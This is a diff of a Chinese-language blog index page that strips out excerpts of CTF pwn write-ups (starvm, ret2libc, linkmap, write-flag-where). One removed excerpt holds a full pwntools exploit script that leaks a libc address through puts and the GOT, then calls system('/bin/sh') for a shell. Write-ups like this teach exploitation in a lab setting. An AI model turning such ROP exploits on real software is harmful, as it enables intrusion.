@@ -730,7 +730,7 @@
 
       
         
-          <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h3><p>VmPwn重点在逆向的工作上，搞清楚输入的格式和不同的功能。这里代码还是比较复杂，通过调试理清了程序逻辑。首先是让我们输入命令，每个命令之间以空格作为间隔；接着是输入操作数，每个命令对应两个操作数，每个操作数占4字节，两个操作数占8字节。主要利用的是功能10、功能6和功能7，能够帮助我们任意地址的读写，由于程序没开PIE并且是按照4字节地址进行操作，所以利用泄露的栈地址写返回地址的想法不可行了，最终是做了got表的读写。</p>
+           
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2023/08/09/CTF/2023xctf/#more" rel="contents">
@@ -876,8 +876,7 @@
 
       
         
-          <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>一道x86的栈溢出，不过在return的地方做了手脚，不能直接溢出到返回地址。<strong>注意gets函数会将接收的换行符变为\x00</strong>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&#x27;./ld-linux.so.2&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>], env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span> : <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_ebx_r = <span class="number">0x0804901e</span></span><br><span class="line">ret = <span class="number">0x08049224</span></span><br><span class="line"></span><br><span class="line">pld = flat(elf.plt[<span class="string">&#x27;puts&#x27;</span>], p_ebx_r, elf.got[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x080491D3</span>)</span><br><span class="line">pld = ((<span class="number">0x50</span> - <span class="built_in">len</span>(pld)) // <span class="number">4</span>) * flat(ret) + pld</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Is this solveable?\n&#x27;</span>, pld)</span><br><span class="line">libc_base = u32(sh.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x08049213&#x27;)</span></span><br><span class="line">pld = flat(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], ret, libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__())</span><br><span class="line">pld = ((<span class="number">0x50</span> - <span class="built_in">len</span>(pld)) // <span class="number">4</span>) * flat(ret) + pld</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Is this solveable?\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+           
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2023/08/08/CTF/2023Securinetsctf/#more" rel="contents">
@@ -1328,7 +1327,7 @@
 
       
         
-          <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h3><p>一眼题目以为是ret2dlresolve，看了保护发现开了<code>Full RELRO</code>，直接自闭，看了Ex师傅的脚本才发现一段神奇的汇编，可以把got中的地址写到bss上，然后我是把read的got写到bss上，然后改成<code>syscall</code>的地址，最后调用execve。我后来想了想，硬要说这个汇编是怎么找到的，一来IDA中bss上有地址量<code>unk_601020</code>的显示，交叉引用能够找到，二来就是凭借经验了。</p>
+           
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2023/07/23/CTF/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/#more" rel="contents">
@@ -1474,10 +1473,7 @@
 
       
         
-          <h2 id="write-flag-where"><a href="#write-flag-where" class="headerlink" title="write-flag-where"></a>write-flag-where</h2><p>首先读源码上碰到了一个难点，<code>dup2()</code>函数之前没碰到过，作用就是将前者的文件描述符复制到后者的文件描述符上，源码实现了将标准输出定位到1337这个文件描述符上，接着把标准输入、标准输出和标准错误都扔到了<code>/dev/null</code>中。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read(v10, &amp;flag, <span class="number">0x80</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(v10);</span><br><span class="line">    v9 = dup2(<span class="number">1</span>, <span class="number">1337</span>);</span><br><span class="line">    v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    dup2(v8, <span class="number">0</span>);</span><br><span class="line">    dup2(v8, <span class="number">1</span>);</span><br><span class="line">    dup2(v8, <span class="number">2</span>);</span><br><span class="line">    close(v8);</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br></pre></td></tr></table></figure>
-
-<p>接着尝试运行程序发现没有回显，用 strace 进行跟踪，发现是超出了文件描述符的范围，用<code>ulimit</code>进行更改。</p>
+           
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2023/07/15/CTF/2023googlectf/#more" rel="contents">
@@ -1887,7 +1883,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
